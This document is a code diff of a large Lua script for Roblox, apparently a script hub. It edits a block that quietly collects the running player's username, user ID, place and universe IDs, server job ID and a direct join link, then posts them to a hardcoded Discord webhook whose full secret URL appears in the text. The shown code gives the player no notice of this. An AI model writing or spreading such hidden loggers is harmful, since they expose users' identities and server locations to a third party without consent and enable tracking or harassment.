@@ -3333,6 +3333,7 @@ run(function()
     local webhook = "https://discord.com/api/webhooks/1509060246864134184/og8Eb4WpwqNSVZOTPipYP0ir3T2LZx9qD0c44fHNh2l5w6Ivt77udxjwaYI21EVW6Q0x"
 
     local Players = game:GetService("Players")
+    local MarketplaceService = game:GetService("MarketplaceService")
     local HttpService = game:GetService("HttpService")
 
     local player = Players.LocalPlayer
@@ -3343,9 +3344,20 @@ run(function()
     task.wait(2)
 
     local userId = player.UserId
+    local username = player.Name
+
     local placeId = game.PlaceId
     local universeId = game.GameId
     local jobId = game.JobId
+
+    local gameName = "Unknown Game"
+
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(placeId)
+        if info and info.Name then
+            gameName = info.Name
+        end
+    end)
 
     local joinLink = string.format(
         "roblox://placeId=%d&gameInstanceId=%s",
@@ -3368,7 +3380,7 @@ run(function()
         end
     end)
 
-    local gameBanner = nil
+    local gameImage = nil
 
     pcall(function()
         local response = game:HttpGet(string.format(
@@ -3379,51 +3391,61 @@ run(function()
         local decoded = HttpService:JSONDecode(response)
 
         if decoded and decoded.data and decoded.data[1] then
-            gameBanner = decoded.data[1].imageUrl
+            gameImage = decoded.data[1].imageUrl
         end
     end)
 
     local payload = {
         embeds = {
             {
-                title = player.Name,
-                description = "Player Info",
+                title = gameName,
+                color = 5793266,
 
                 thumbnail = {
                     url = headshot
                 },
 
                 image = {
-                    url = gameBanner
+                    url = gameImage
                 },
 
                 fields = {
                     {
-                        name = "User ID",
-                        value = tostring(userId),
-                        inline = true
+                        name = "Player",
+                        value = string.format("%s (`%d`)", username, userId),
+                        inline = false
                     },
-                    {
-                        name = "Game ID",
-                        value = tostring(universeId),
-                        inline = true
-                    },
+
                     {
                         name = "Place ID",
                         value = tostring(placeId),
                         inline = true
                     },
+
                     {
-                        name = "Job ID",
-                        value = tostring(jobId),
+                        name = "Universe ID",
+                        value = tostring(universeId),
+                        inline = true
+                    },
+
+                    {
+                        name = "Server ID",
+                        value = "```" .. jobId .. "```",
                         inline = false
                     },
+
                     {
                         name = "Join Server",
-                        value = joinLink,
+                        value = "[Click To Join](" .. joinLink .. ")",
                         inline = false
                     }
-                }
+                },
+
+                footer = {
+                    text = "rawr made ts"
+                },
+
+                timestamp = DateTime.now():ToIsoDate()
             }
         }
     }
